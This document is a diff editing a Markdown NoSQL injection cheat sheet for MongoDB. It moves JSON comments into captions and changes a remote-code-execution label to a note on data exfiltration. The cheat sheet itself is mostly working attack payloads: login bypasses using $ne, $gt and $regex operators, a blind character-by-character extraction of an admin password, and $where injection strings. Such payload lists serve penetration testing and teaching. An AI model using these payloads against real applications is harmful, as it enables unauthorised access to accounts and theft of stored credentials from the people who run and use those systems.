@@ -29,14 +29,18 @@ username[$nin][0]=x&password[$nin][0]=x
 
 ## Authentication Bypass
 
+Bypass login — match any user/password:
 ```json
-// Bypass login — match any user/password
 {"username": {"$ne": ""}, "password": {"$ne": ""}}
+```
 
-// Target specific user
+Target specific user:
+```json
 {"username": "admin", "password": {"$gt": ""}}
+```
 
-// Bypass with $regex
+Bypass with $regex:
+```json
 {"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
 ```
 
@@ -78,17 +82,21 @@ Increment length until response changes.
 
 ### Boolean-Based
 
+True condition:
 ```json
-// True condition
 {"username": "admin", "password": {"$ne": ""}}
+```
 
-// False condition
+False condition:
+```json
 {"username": "admin", "password": {"$eq": "definitelywrong"}}
+```
 
-// Extract data character by character
-{"username": "admin", "password": {"$regex": "^p"}}    // true/false
-{"username": "admin", "password": {"$regex": "^pa"}}   // true/false
-{"username": "admin", "password": {"$regex": "^pas"}}  // true/false
+Extract data character by character:
+```json
+{"username": "admin", "password": {"$regex": "^p"}}
+{"username": "admin", "password": {"$regex": "^pa"}}
+{"username": "admin", "password": {"$regex": "^pas"}}
 ```
 
 ### Time-Based (via $where)
@@ -104,13 +112,19 @@ Increment length until response changes.
 {"$where": "return true"}
 {"$where": "1==1"}
 {"$where": "this.password.match(/.*/)"}
+```
 
-// RCE via $where (older MongoDB < 2.4)
+Data exfiltration via `$where` (MongoDB < 4.2, sandboxed JS — no filesystem/RCE):
+```json
 {"$where": "function(){return this.username == tojsononeline(this)}"}
+```
 
-// Data exfiltration
+Combined query:
+```json
 {"username": {"$gt": ""}, "$where": "this.username == 'admin'"}
 ```
+
+Note: `$where` is deprecated in MongoDB 4.2+ and disabled by default with `--noscripting`. Server-side JS runs in a sandbox with no `require()`, filesystem, or network access — it enables data exfiltration, not RCE.
 
 ## Other Operators
 
